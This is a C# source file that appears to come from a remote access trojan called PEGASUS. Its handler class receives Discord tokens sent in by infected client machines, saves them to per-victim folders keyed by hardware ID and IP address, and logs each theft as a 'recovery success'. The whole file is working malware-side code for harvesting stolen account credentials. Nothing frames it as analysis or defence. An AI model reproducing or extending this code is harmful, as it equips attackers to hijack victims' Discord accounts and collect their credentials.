namespace PEGASUS.BytesInOut
{
    using PEGASUS.Diadyktio;
    using PEGASUS.Metafora_Dedomenon;
    using System;
    using System.Drawing;
    using System.IO;
    using System.Windows.Forms;

    /// <summary>
    /// Defines the <see cref="HandleDiscordRecovery" />.
    /// </summary>
    public class HandleDiscordRecovery
    {
        /// <summary>
        /// Initializes a new instance of the <see cref="HandleDiscordRecovery"/> class.
        /// </summary>
        /// <param name="client">The client<see cref="Clients"/>.</param>
        /// <param name="unpack_msgpack">The unpack_msgpack<see cref="MsgPack"/>.</param>
        public HandleDiscordRecovery(Clients client, MsgPack unpack_msgpack)
        {
            try
            {
                var fullPath = Path.Combine(Application.StartupPath, "ClientsFolder",
                    unpack_msgpack.ForcePathObject("Hwid").AsString, "Discord");
                var tokens = unpack_msgpack.ForcePathObject("Tokens").AsString;
                if (!string.IsNullOrWhiteSpace(tokens))
                {
                    if (!Directory.Exists(fullPath))
                        Directory.CreateDirectory(fullPath);
                    File.WriteAllText(fullPath + "\\Tokens_" + DateTime.Now.ToString("MM-dd-yyyy HH;mm;ss") + ".txt",
                        tokens.Replace("\n", Environment.NewLine));
                    new HandleLogs().Addmsg(
                        $"Client {client.Ip} discord recovery success，file located @ ClientsFolder \\ {unpack_msgpack.ForcePathObject("Hwid").AsString} \\ Discord",
                        Color.IndianRed);
                }
                else
                {
                    new HandleLogs().Addmsg($"Client {client.Ip} discord recovery error", Color.MediumPurple);
                }

                client?.Disconnected();
            }
            catch (Exception ex)
            {
                new HandleLogs().Addmsg(ex.Message, Color.Red);
            }
        }
    }
}
